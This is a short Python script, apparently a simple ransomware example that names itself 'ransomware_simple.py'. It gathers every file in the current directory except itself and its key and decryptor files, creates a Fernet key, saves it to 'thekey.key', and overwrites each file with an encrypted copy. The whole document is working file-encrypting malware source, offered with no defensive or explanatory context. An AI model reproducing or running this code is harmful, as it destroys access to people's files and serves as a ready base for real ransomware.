import os 
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware_simple.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key1 = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key1)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key1).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)
